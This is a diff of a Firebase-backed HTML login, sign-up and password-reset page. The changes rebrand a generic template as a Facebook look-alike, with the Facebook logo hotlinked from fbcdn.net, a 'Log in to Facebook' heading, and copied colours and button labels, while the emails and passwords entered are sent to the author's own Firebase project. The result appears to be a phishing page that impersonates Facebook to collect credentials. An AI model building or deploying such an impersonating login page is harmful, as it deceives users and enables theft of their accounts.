@@ -9,37 +9,42 @@
             margin: 0;
             padding: 0;
             font-family: 'Arial', sans-serif;
-            background: linear-gradient(to bottom, #4facfe, #f093fb); /* Gradient from blue to pink */
+            background-color: #f0f2f5;
             color: #333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
         }
 
         .container {
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
+            width: 100%;
+            max-width: 1200px;
             padding: 20px;
         }
 
-        .login-box, .register-box {
+        .login-box, .register-box, .reset-box {
             background-color: white;
             width: 100%;
             max-width: 400px;
-            padding: 30px;
-            border-radius: 10px;
+            padding: 20px;
+            border-radius: 8px;
             box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
             text-align: center;
         }
 
         .logo {
-            width: 100px; /* Logo width for larger screens */
-            max-width: 100%;
+            width: 200px;
             margin-bottom: 20px;
         }
 
         h2 {
             margin-bottom: 20px;
-            color: #333;
+            color: #1877F2;
+            font-size: 24px;
         }
 
         .input-group {
@@ -50,37 +55,60 @@
         label {
             display: block;
             margin-bottom: 5px;
-            color: #555;
+            color: #606770;
+            font-size: 14px;
         }
 
         input {
             width: 100%;
             padding: 10px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            font-size: 14px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+
+        input:focus {
+            border-color: #1877F2;
+            outline: none;
         }
 
         button {
             width: 100%;
-            padding: 10px;
+            padding: 12px;
             background-color: #1877F2;
             border: none;
-            border-radius: 5px;
+            border-radius: 6px;
             color: white;
             font-size: 16px;
+            font-weight: bold;
             cursor: pointer;
             margin-top: 10px;
         }
 
         button:hover {
-            background-color: #155db0;
+            background-color: #166fe5;
         }
 
         .message {
             text-align: center;
             margin-top: 10px;
-            color: red;
+            padding: 10px;
+            border-radius: 6px;
+            font-size: 14px;
+            display: none;
+        }
+
+        .message.error {
+            background-color: #ffebe8;
+            border: 1px solid #ff3b30;
+            color: #ff3b30;
+        }
+
+        .message.success {
+            background-color: #e8f5e9;
+            border: 1px solid #4caf50;
+            color: #4caf50;
         }
 
         .link {
@@ -91,6 +119,7 @@
         .link a {
             color: #1877F2;
             text-decoration: none;
+            font-size: 14px;
         }
 
         .link a:hover {
@@ -103,17 +132,21 @@
                 padding: 10px;
             }
 
-            .login-box, .register-box {
-                padding: 20px;
+            .login-box, .register-box, .reset-box {
+                padding: 15px;
             }
 
             .logo {
-                width: 80px; /* Resize logo for tablets */
+                width: 150px;
+            }
+
+            h2 {
+                font-size: 20px;
             }
 
             button {
                 font-size: 14px;
-                padding: 8px;
+                padding: 10px;
             }
         }
 
@@ -122,12 +155,16 @@
                 padding: 10px;
             }
 
-            .login-box, .register-box {
-                padding: 15px;
+            .login-box, .register-box, .reset-box {
+                padding: 10px;
             }
 
             .logo {
-                width: 60px; /* Resize logo for smaller mobile devices */
+                width: 120px;
+            }
+
+            h2 {
+                font-size: 18px;
             }
 
             button {
@@ -142,8 +179,8 @@
 <div class="container">
     <!-- Login Box -->
     <div class="login-box" id="login-box">
-        <img src="logo.png" alt="Logo" class="logo"> <!-- Add your logo image here -->
-        <h2>Login</h2>
+        <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook Logo" class="logo">
+        <h2>Log in to Facebook</h2>
         <div class="input-group">
             <label for="login-email">Email</label>
             <input type="email" id="login-email" placeholder="Enter your email" required>
@@ -152,20 +189,20 @@
             <label for="login-password">Password</label>
             <input type="password" id="login-password" placeholder="Enter your password" required>
         </div>
-        <button onclick="loginUser()">Login</button>
+        <button onclick="loginUser()">Log In</button>
         <div class="message" id="login-message"></div>
         <div class="link">
             <a href="#" onclick="showReset()">Forgot Password?</a>
         </div>
         <div class="link">
-            <a href="#" onclick="showRegister()">Don't have an account? Register</a>
+            <a href="#" onclick="showRegister()">Create New Account</a>
         </div>
     </div>
 
     <!-- Register Box (Initially hidden) -->
     <div class="register-box" id="register-box" style="display: none;">
-        <img src="logo.png" alt="Logo" class="logo"> <!-- Add your logo image here -->
-        <h2>Register</h2>
+        <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook Logo" class="logo">
+        <h2>Sign Up</h2>
         <div class="input-group">
             <label for="register-email">Email</label>
             <input type="email" id="register-email" placeholder="Enter your email" required>
@@ -174,16 +211,16 @@
             <label for="register-password">Password</label>
             <input type="password" id="register-password" placeholder="Enter your password" required>
         </div>
-        <button onclick="registerUser()">Register</button>
+        <button onclick="registerUser()">Sign Up</button>
         <div class="message" id="register-message"></div>
         <div class="link">
-            <a href="#" onclick="showLogin()">Already have an account? Login</a>
+            <a href="#" onclick="showLogin()">Already have an account? Log In</a>
         </div>
     </div>
 
     <!-- Reset Password Box (Initially hidden) -->
-    <div class="register-box" id="reset-box" style="display: none;">
-        <img src="logo.png" alt="Logo" class="logo"> <!-- Add your logo image here -->
+    <div class="reset-box" id="reset-box" style="display: none;">
+        <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook Logo" class="logo">
         <h2>Reset Password</h2>
         <div class="input-group">
             <label for="reset-email">Email</label>
@@ -192,7 +229,7 @@
         <button onclick="resetPassword()">Reset Password</button>
         <div class="message" id="reset-message"></div>
         <div class="link">
-            <a href="#" onclick="showLogin()">Back to Login</a>
+            <a href="#" onclick="showLogin()">Back to Log In</a>
         </div>
     </div>
 </div>
@@ -227,7 +264,7 @@
                 window.location.href = "main.html";
             })
             .catch((error) => {
-                document.getElementById('login-message').innerHTML = error.message;
+                showMessage('login-message', error.message, 'error');
             });
     }
 
@@ -238,10 +275,10 @@
 
         auth.createUserWithEmailAndPassword(email, password)
             .then((userCredential) => {
-                document.getElementById('register-message').innerHTML = "Registration successful!";
+                showMessage('register-message', "Registration successful!", 'success');
             })
             .catch((error) => {
-                document.getElementById('register-message').innerHTML = error.message;
+                showMessage('register-message', error.message, 'error');
             });
     }
 
@@ -251,11 +288,19 @@
 
         auth.sendPasswordResetEmail(email)
             .then(() => {
-                document.getElementById('reset-message').innerHTML = "Password reset email sent!";
+                showMessage('reset-message', "Password reset email sent!", 'success');
             })
             .catch((error) => {
-                document.getElementById('reset-message').innerHTML = error.message;
+                showMessage('reset-message', error.message, 'error');
             });
+    }
+
+    // Show message
+    function showMessage(elementId, message, type) {
+        const messageElement = document.getElementById(elementId);
+        messageElement.textContent = message;
+        messageElement.className = `message ${type}`;
+        messageElement.style.display = 'block';
     }
 
     // Switch to register form
